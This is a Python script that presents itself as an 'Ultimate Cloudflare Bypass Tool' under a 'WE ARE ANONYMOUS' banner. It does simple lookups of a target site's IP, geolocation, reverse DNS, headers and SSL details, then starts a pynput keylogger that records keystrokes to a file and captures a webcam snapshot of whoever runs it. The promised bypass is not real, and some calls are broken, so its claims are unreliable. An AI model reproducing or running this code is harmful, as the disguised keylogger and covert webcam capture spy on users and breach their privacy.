#!/usr/bin/env python3
import time
import os
import socket
import requests
import re
import json
import time
import datetime
import pynput
import cv2
from pynput.keyboard import Key, Listener
from pynput import mouse
from datetime import datetime
from pyfiglet import Figlet

os.system("clear")

f = Figlet(font="slant")
print(f.renderText("WE ARE ANONYMOUS"))

time.sleep(4)

# script begin lalalala
print("Starting byreku me mish tool")

# ----------------------------- #
#       Configuration         #
# ----------------------------- #

# Set the target website
target_website = input("Enter the website name (e.g., google.com): ")

# Set output folder
output_folder = "CloudflareBypassOutput"
os.makedirs(output_folder, exist_ok=True)
log_file = os.path.join(output_folder, "bypass_log.txt")
webcam_file = os.path.join(output_folder, "webcam.jpg")
keylog_file = os.path.join(output_folder, "keylog.txt")
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

# ----------------------------- #
#       Functions             #
# ----------------------------- #

def get_real_ip(url):
    try:
        response = requests.get(f"https://{url}", timeout=10)
        response.raise_for_status()
        real_ip = response.headers.get("CF-Connecting-IP", "N/A")
        if real_ip != "N/A":
            return real_ip
        else:
            ip_address = socket.gethostbyname(url)
            return ip_address
    except Exception as e:
        return f"[-] Error: {e}"

def get_geolocation(ip):
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/")
        response.raise_for_status()
        data = response.json()
        return data
    except Exception as e:
        return f"[-] Error: {e}"

def get_dns_records(ip):
    try:
        return socket.gethostbyaddr(ip)
    except socket.herror:
        return f"[-] Could not resolve DNS records."

def get_headers(url):
    try:
        response = requests.get(url)
        return response.headers
    except Exception as e:
        return f"[-] Error: {e}"

def get_ssl_info(url):
    try:
        response = requests.get(url, verify=True)
        return {
            "SSL Version": response.connection.sock.version(),
            "SSL Cipher": response.connection.sock.cipher()[0],
            "SSL Cert": response.connection.sock.getpeercert()
        }
    except Exception as e:
        return f"[-] Error: {e}"

def start_keylogger():
    print(f"[+] Starting Keylogger...")
    with open(keylog_file, "a") as f:
        def on_press(key):
            try:
                f.write(str(key.char))
            except AttributeError:
                f.write(str(key))
        with Listener(on_press=on_press) as listener:
            listener.join()

def take_webcam_snapshot():
    print("[+] Taking webcam snapshot...")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("[-] Could not open webcam.")
        return
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(webcam_file, frame)
        print(f"[+] Webcam snapshot saved as: {webcam_file}")
    else:
        print("[-] Could not read webcam frame.")
    cap.release()

def log_to_file(message):
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {message}\n")

# ----------------------------- #
#       Main Execution        #
# ----------------------------- #

print(f"\n[+] Ultimate Cloudflare Bypass Tool - {timestamp}")
print(f"[+] Target Website: {target_website}")

real_ip = get_real_ip(target_website)
if real_ip:
    log_to_file(f"[+] Real IP: {real_ip}")
    print(f"[+] Real IP: {real_ip}")
else:
    print(f"[-] Could not find real IP.")

geolocation = get_geolocation(real_ip)
if geolocation:
    log_to_file(f"[+] Geolocation: {geolocation}")
    print(f"[+] Geolocation: {geolocation}")

dns_records = get_dns_records(real_ip)
if dns_records:
    log_to_file(f"[+] DNS Records: {dns_records}")
    print(f"[+] DNS Records: {dns_records}")

headers = get_headers(target_website)
if headers:
    log_to_file(f"[+] HTTP Headers: {headers}")
    print(f"[+] HTTP Headers: {headers}")

ssl_info = get_ssl_info(target_website)
if ssl_info:
    log_to_file(f"[+] SSL Info: {ssl_info}")
    print(f"[+] SSL Info: {ssl_info}")

# Optional: Start Keylogger
start_keylogger()

# Optional: Take Webcam Snapshot
take_webcam_snapshot()

print(f"[+] All data saved in: {output_folder}")
print("[+] Done!")
